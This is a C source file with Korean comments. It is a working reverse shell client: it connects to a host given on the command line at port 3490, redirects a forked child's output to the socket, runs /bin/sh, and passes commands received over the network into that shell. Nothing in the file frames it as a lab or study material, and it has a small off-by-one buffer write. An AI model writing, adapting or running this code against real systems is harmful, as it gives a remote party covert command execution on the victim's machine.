#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define PORT 3490 /* the port client will be connecting to */

#define MAXDATASIZE 100 /* max number of bytes we can get at once */

int main(int argc, char* argv[]) {
    int pipefd[2];
    pid_t pid;
    char buffer[256];
    int sockfd, numbytes;
    char buf[MAXDATASIZE];
    struct hostent* he;
    struct sockaddr_in their_addr; /* connector's address information */

    if (argc != 2) {
        fprintf(stderr, "usage: client hostname\n");
        exit(1);
    }

    if ((he = gethostbyname(argv[1])) == NULL) { /* get the host info */
        herror("gethostbyname");
        exit(1);
    }

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(1);
    }

    their_addr.sin_family = AF_INET;   /* host byte order */
    their_addr.sin_port = htons(PORT); /* short, network byte order */
    their_addr.sin_addr = *((struct in_addr*)he->h_addr);
    bzero(&(their_addr.sin_zero), 8); /* zero the rest of the struct */

    if (connect(sockfd, (struct sockaddr*)&their_addr,
                sizeof(struct sockaddr)) == -1) {
        perror("connect");
        exit(1);
    }

    // 파이프 생성
    if (pipe(pipefd) == -1) {
        perror("pipe");
        return 1;
    }

    // child process 생성
    pid = fork();

    if (pid == -1) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        // child process

        // 파이프의 쓰기 단을 닫음
        close(pipefd[1]);

        // 표준 출력을 소켓으로 리디렉션
        if (dup2(sockfd, STDOUT_FILENO) < 0) {
            perror("리디렉션 실패");
            exit(1);
        }
        // 표준 에러를 소켓으로 리디렉션
        if (dup2(sockfd, STDERR_FILENO) < 0) {
            perror("리디렉션 실패");
            exit(1);
        }
        // 표준 입력을 파이프로 리디렉션
        if (dup2(pipefd[0], STDIN_FILENO) < 0) {
            perror("리디렉션 실패");
            exit(1);
        }

        // 실행할 프로그램 경로와 인자 설정
        char* programPath = "/bin/sh";
        char* args[] = {programPath, NULL};

        // execve() 함수로 다른 프로그램 실행
        execve(programPath, args, NULL);

        // execve() 호출이 성공하지 않은 경우에만 아래 코드가 실행됨
        perror("execve 실패");
        exit(1);
    } else {
        // parent process

        // 파이프의 읽기 단을 닫음
        close(pipefd[0]);
        while (1) {
            numbytes = recvfrom(sockfd, buf, MAXDATASIZE, 0, 0, 0);
            if (numbytes <= 0) {
                perror("recvfrom");
                exit(1);
            }
            buf[numbytes] = '\n';
            // 메시지를 작성하여 파이프에 씀
            write(pipefd[1], buf, numbytes + 1);
            /**
             * @todo 수행한 명령어가 exit\n인지 확인하고 맞다면 break;
             * 
             */
        }
        // 파이프의 쓰기 단을 닫음
        close(pipefd[1]);
        close(sockfd);// 소켓을 닫음
    }

    return 0;
}